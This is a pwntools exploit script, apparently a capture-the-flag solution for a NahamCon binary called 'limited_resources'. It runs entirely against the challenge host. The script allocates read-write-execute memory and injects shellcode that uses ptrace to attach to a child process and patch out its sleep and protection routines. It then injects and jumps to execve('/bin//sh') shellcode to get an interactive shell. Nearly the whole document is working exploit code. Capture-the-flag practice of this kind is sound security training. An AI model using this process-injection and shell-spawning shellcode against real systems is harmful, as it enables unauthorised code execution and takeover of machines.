from pwn import *

CONN = "nc challenge.nahamcon.com 32546".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
continue
""".format(
    **locals()
)

# Binary filename
exe = "./limited_resources"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("/lib64/ld-linux-x86-64.so.2")

if args.REMOTE:
    libc = ELF("./libc-2.27.so")

# Start program
io = start()
offset = 0
# Build the payload

# Send the payload
io.sendlineafter(b"Exit\n", b"2")
io.recvuntil(b"=")

PID = int(io.recvline().decode().strip(), 10)
success("PID: " + str(PID))

# info("Canary: " + hex(LEAKED))
shellcode = asm('''
    looping:

      mov ebp,%d        /* ebp = pid of child */
    // ptrace(PTRACE_ATTACH,child,0,0)
      mov edi,0x10
      mov esi,ebp
      xor edx,edx
      xor r10,r10
      mov eax,101
      syscall

    // wait a bit
      mov rcx,0xffffffff
    wait:
      nop
      nop
      loop wait

    /* patch program to remove jmp after call to sleep() */
    /* ptrace(PTRACE_POKEDATA,chid, addr, data */
      mov edi,5
      mov esi,ebp
      mov edx,0x4018df
      mov r10,0xE800402090bf9090
      mov eax,101
      syscall

    /* patch program to remove call to protectprogram() */
    /* ptrace(PTRACE_POKEDATA,chid, addr, data */
      mov edi,5
      mov esi,ebp
      mov edx,0x401aa9
      mov r10,0x9090909090000000
      mov eax,101
      syscall

    // ptrace(PTRACE_DETACH,child,0,0
      mov edi,0x11
      mov esi,ebp
      xor edx,edx
      xor r10,r10
      mov eax,101
      syscall


    loopit:
     jmp loopit

    format:
      .ascii "result = %%llx"
      .byte 10

    ''' % PID)

io.sendlineafter(b"Exit\n", b"1")
io.sendlineafter(b"?\n", str(0x5000).encode())
io.sendlineafter(b"?\n", b"7") #RWX
io.sendlineafter(b"?\n", shellcode)

io.recvuntil(b"buffer at ")
buffer_addr = int(io.recvline().decode().strip(), 16)

success("Buffer: " + hex(buffer_addr))

execve = asm('''
  mov rbx, 0x68732f2f6e69622f
  xor esi, esi
  push rsi
  push rbx
  mov rdi, rsp
  xor esi, esi
  xor edx, edx
  mov rax, 0x3b
  syscall
''')

io.sendlineafter(b'Exit\n',b'1')
io.sendlineafter(b'?\n', str(0x1000).encode())
io.sendlineafter(b'?\n', b"7") # READ | WRITE | EXECUTE
io.sendlineafter(b'?\n', execve)

io.recvuntil(b"buffer at ")
shellcode_addr = int(io.recvuntil(b"\n", drop=True).decode(), 16)

success("Shellcode: " + hex(shellcode_addr))
io.sendlineafter(b'Exit\n',b'3')
io.sendlineafter(b"?\n", hex(shellcode_addr).encode())

io.interactive()